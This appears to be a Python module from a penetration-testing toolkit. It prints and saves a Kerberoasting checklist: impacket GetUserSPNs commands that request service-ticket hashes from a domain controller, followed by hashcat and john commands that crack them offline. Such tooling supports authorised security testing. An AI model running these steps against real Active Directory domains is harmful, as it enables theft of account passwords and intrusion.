"""kerberoast — Kerberoasting checklist (impacket GetUserSPNs)"""
from pathlib import Path

class Kerberoast:
    def run(self, session, logger):
        print("[kerberoast] requires domain credentials + impacket")
        print()
        steps = [
            "pip install impacket",
            f"GetUserSPNs.py DOMAIN/user:password -dc-ip {session.target} -request",
            f"GetUserSPNs.py DOMAIN/user:password -dc-ip {session.target} -request -outputfile hashes.txt",
            "# crack:",
            "hashcat -m 13100 hashes.txt wordlist.txt",
            "john --format=krb5tgs hashes.txt",
        ]
        for s in steps:
            print(f"  {s}")
        out = Path("reports") / "kerberoast_commands.txt"
        out.parent.mkdir(exist_ok=True)
        out.write_text("\n".join(steps))
        logger.info("kerberoast_guide", path=str(out))
        return {"steps": steps}
